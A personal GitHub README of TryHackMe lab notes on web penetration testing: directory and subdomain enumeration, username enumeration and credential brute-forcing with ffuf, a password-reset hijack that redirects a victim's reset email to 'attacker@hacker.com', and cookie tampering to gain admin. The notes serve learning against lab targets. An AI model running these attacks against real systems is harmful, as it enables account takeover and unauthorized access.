# cyber-security
My journey into cybersecurity and penetration testing. Transitioning into Cybersecurity with focus on Penetration Testing and Vulnerability Assessment.

Location: Netherlands  
Background: IT Operations, QA, Support

## Skills

- Network Security
- Web Security
- Penetration Testing
- Vulnerability Assessment

## Labs Completed

- TryHackMe Labs
  dirb http:// shown the open link after + icon
  Cntent discovery
  Framework version and changelog can tell about potential vulnnerabilities
  Accessing the directories like /assets can give unpermittedd access
  DOM structuree might contain secret pages
  "Pretty print" to read js files in the source, can be done by pressing {} button

  Favicon can be degugged in terminal with command curl URL | md5sum to define the framework via https://wiki.owasp.org/index.php/OWASP_favicon_database, after that the framework page can  tell if any default admin credentials are still available to exploit the system
  Robot.txt can be checked for any content not allowedd to be seen: http://.../robot.txt
  In sitemap, the pages which should be parsed by crawlers, can be checked for secret pages too .../sitemap.xml

   Try running the below curl command against the web server, where the -v switch enables verbose mode, which will output the headers (there might be something interesting!). curl http://... -v
 OSINT  Google Hacking / Dorking https://en.wikipedia.org/wiki/Google_hacking

https://archive.org/web/ to access the old revision of the content to see if old pages are accessible

You can use GitHub's search feature to look for company names or website names to try and locate repositories belonging to your target. Once discovered, you may have access to source code, passwords or other content that you hadn't yet found.
S3 Buckets are a storage service provided by Amazon AWS, allowing people to save files and even static website content in the cloud accessible over HTTP and HTTPS. The owner of the files can set access permissions to either make files public, private and even writable. Sometimes these access permissions are incorrectly set and inadvertently allow access to files that shouldn't be available to the public. The format of the S3 buckets is http(s)://{name}.s3.amazonaws.com where {name} is decided by the owner, such as tryhackme-assets.s3.amazonaws.com. S3 buckets can be discovered in many ways, such as finding the URLs in the website's page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as {name}-assets, {name}-www, {name}-public, {name}-private, etc.
Workiing with the worlists withh the Automation Tools:
user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://MACHINE_IP/FUZZ
user@machine$ dirb http://MACHINE_IP/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
user@machine$ gobuster dir --url http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

Three different subdomain enumeration methods: 
Brute Force
- dnsrecon -t brt -d acmeitsupport.thm
OSINT (Open-Source Intelligence):
- Go to Google and use the search term site:*.tryhackme.com -site:www.tryhackme.com, which should reveal a subdomain for tryhackme.com; use that subdomain to answer the question below.
- Sublist3r https://www.kali.org/tools/sublist3r/  ./sublist3r.py -d acmeitsupport.thm
- SSL/TLS
  -- Via Ctr if the webiste is overloaded, curl "https://crt.sh/?q=%25.tryhackme.com&output=json"
  -- via Kali Linux
Virtual Host
- user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.114.161.56
The above command uses the -w switch to specify the wordlist we are going to use. The -H switch adds/edits a header (in this instance, the Host header), we have the FUZZ keyword in the space where a subdomain would normally go, and this is where we will try all the options from the wordlist.
Because the above command will always produce a valid result, we need to filter the output. We can do this by using the page size result with the -fs switch. Edit the below command replacing {size} with the most occurring size value
- user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.114.161.56 -fs {size}
This command has a similar syntax to the first apart from the -fs switch, which tells ffuf to ignore any results that are of the specified size

Username enumeration:
- user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.114.128.42/customers/signup -mr "username already exists"
the -w argument selects the file's location on the computer that contains the list of usernames that we're going to check exists. The -X argument specifies the request method, this will be a GET request by default, but it is a POST request in our example. The -d argument specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword. We've set the value of the username to FUZZ. In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request. The -H argument is used for adding additional headers to the request. In this instance, we're setting the Content-Type so the web server knows we are sending form data. The -u argument specifies the URL we are making the request to, and finally, the -mr argument is the text on the page we are looking for to validate we've found a valid username.
Credentials enumeration Brute force:
created a txt file with the usernames from the previous step and put it in the same directory as SecLists
- user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.114.152.71/customers/login -fc 200
This ffuf command is a little different to the previous one in Task 2. Previously we used the FUZZ keyword to select where in the request the data from the wordlists would be inserted, but because we're using multiple wordlists, we have to specify our own FUZZ keyword. In this instance, we've chosen W1 for our list of valid usernames and W2 for the list of passwords we will try. The multiple wordlists are again specified with the -w argument but separated with a comma.  For a positive match, we're using the -fc argument to check for an HTTP status code other than 200.
Logic flow is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker.
Example PHP script:
if( url.substr(0,6) === '/admin') {
    ##Code to check user is an admin
} else {
    # View Page
}
Example for PHP:
user@tryhackme$ curl 'http://10.112.181.83/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
We use the -H flag to add an additional header to the request. In this instance, we are setting the Content-Type to application/x-www-form-urlencoded, which lets the web server know we are sending form data so it properly understands our request.
In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable $_REQUEST.
The PHP $_REQUEST variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.
user@tryhackme$ curl 'http://10.112.181.83/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
Create an emppty account
user@tryhackme$ curl 'http://10.112.181.83/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={enpty_account_email}'

Cookie tempering:
user@tryhackme$ curl http://10.112.181.83/cookie-test
user@tryhackme$ curl -H "Cookie: logged_in=true; admin=false" http://10.112.181.83/cookie-test
user@tryhackme$ curl -H "Cookie: logged_in=true; admin=true" http://10.112.181.83/cookie-test

https://crackstation.net for reverse the hash of any type
https://www.base64encode.org

IDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability.

SSRF stands for Server-Side Request Forgery cane be 2 types:
- regular SSRF where data is returned to the attacker's screen
- Blind SSRF vulnerability where an SSRF occurs, but no information is returned to the attacker's screen.
A successful SSRF attack can result in any of the following: 
Access to unauthorised areas.
Access to customer/organisational data.
Ability to Scale to internal networks.
Reveal authentication tokens/credentials.

  
- HackTheBox Machines
- PortSwigger Labs

## Certifications

- ISC2 Certified in Cybersecurity (in progress)


